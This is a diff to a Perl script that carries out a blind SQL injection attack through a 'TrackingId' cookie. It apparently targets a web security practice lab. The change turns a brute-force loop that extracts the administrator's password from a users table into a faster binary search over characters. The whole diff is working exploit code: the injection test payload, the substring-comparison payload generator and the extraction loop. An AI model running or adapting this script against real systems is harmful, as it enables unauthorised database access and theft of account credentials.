@@ -29,6 +29,7 @@ our(
 );
 
 our $query = "(select password from users where username='administrator')";
+# our $query = "(select username from users where username='administrator')";
 
 GetOptions(
     'u|url=s'           => \$url,
@@ -60,19 +61,29 @@ if ($proxy) {
 }
 
 print colored("[*] SQL injection test... ", "cyan");
-say makeRequest("TrackingId=' or '1'='1") ? colored("OK", "green") : colored("ERROR", "red");
+say &makeRequest("TrackingId=' or '1'='1") ? colored("OK", "green") : colored("ERROR", "red");
 
 say colored("[*] Obtaining password for user 'administrator', it may take a while... ", "cyan");
 
 my $password = '';
+my @chars = ('0'..'9', 'A'..'Z', 'a'..'z');
 for my $length (1..$maxLength) {
-    for my $i (ord('!')..ord('~')) {
-        my $letter = chr($i);
-        next if $letter eq '%'; # 500 Internal server error for this char
-        my $payload = &generatePayload($password . $letter);
-        if (&makeRequest($payload)) {
+    my ($begin, $end) = (0, $#chars);
+    while ($begin <= $end) {
+        my $middle = int(($begin + $end + 1) / 2);
+        my $letter = $chars[$middle];
+        my $payload = &generatePayload($length, $letter);
+        my $result = &makeRequest($payload);
+
+        if ($begin == $middle && $middle == $end && !$result) {
             $password .= $letter;
             last;
+        }
+
+        if ($result) {
+            $end = $middle - 1;
+        } else {
+            $begin = $middle;
         }
     }
     say colored("[$length] Found: $password" , "green");
@@ -82,8 +93,9 @@ for my $length (1..$maxLength) {
 say colored("[*] Finished.", "bold magenta");
 
 sub generatePayload {
+    my $idx = shift;
     my $pass = shift;
-    my $payload = "TrackingId=' or substring($query, 1, " . length($pass) . ") = '$pass";
+    my $payload = "TrackingId=' or substring($query, $idx, 1) < '$pass";
     return $payload;
 }
 
